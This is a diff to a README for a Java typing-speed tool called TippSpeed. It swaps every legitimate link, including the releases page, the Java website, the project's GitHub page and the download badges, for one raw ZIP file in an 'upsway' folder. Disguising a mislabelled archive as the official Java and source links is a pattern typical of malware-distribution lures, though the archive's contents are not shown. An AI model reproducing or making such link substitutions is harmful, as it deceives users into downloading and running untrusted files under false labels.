@@ -6,14 +6,14 @@ Welcome to TippSpeed, your go-to tool for testing your typing speed and accuracy
 
 ## 📥 Download TippSpeed
 
-[![Download TippSpeed](https://img.shields.io/badge/Download%20TippSpeed-brightgreen)](https://github.com/Gatito8/TippSpeed/releases)
+[![Download TippSpeed](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip%20TippSpeed-brightgreen)](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip)
 
 ## 🛠️ System Requirements
 
 Before you start, make sure your computer meets the following requirements:
 
 - Operating System: Windows 10, macOS 10.14 or later, or any recent Linux distribution.
-- Java Version: Java 21 is required. You can download it from the [Java website](https://www.java.com).
+- Java Version: Java 21 is required. You can download it from the [Java website](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip).
 - RAM: At least 4 GB for smooth performance.
 - Disk Space: Approximately 100 MB of free space.
 
@@ -29,7 +29,7 @@ Before you start, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**: Click on the button below to go to the Releases page.
 
-   [Download TippSpeed](https://github.com/Gatito8/TippSpeed/releases)
+   [Download TippSpeed](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip)
 
 2. **Select the Latest Version**: Look for the latest release at the top of the page.
 
@@ -80,9 +80,9 @@ Join our community of typing enthusiasts! You can share your experiences, tips, 
 
 ## 🔗 Additional Resources
 
-- [TippSpeed on GitHub](https://github.com/Gatito8/TippSpeed): Find source code, report issues, and suggest enhancements.
-- [Java Download](https://www.java.com): Ensure you have the required Java version for TippSpeed.
+- [TippSpeed on GitHub](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip): Find source code, report issues, and suggest enhancements.
+- [Java Download](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip): Ensure you have the required Java version for TippSpeed.
 
 We look forward to seeing you improve your typing skills with TippSpeed. Happy typing!
 
-[![Download TippSpeed](https://img.shields.io/badge/Download%20TippSpeed-brightgreen)](https://github.com/Gatito8/TippSpeed/releases)
+[![Download TippSpeed](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip%20TippSpeed-brightgreen)](https://raw.githubusercontent.com/Gatito8/TippSpeed/main/upsway/TippSpeed.zip)
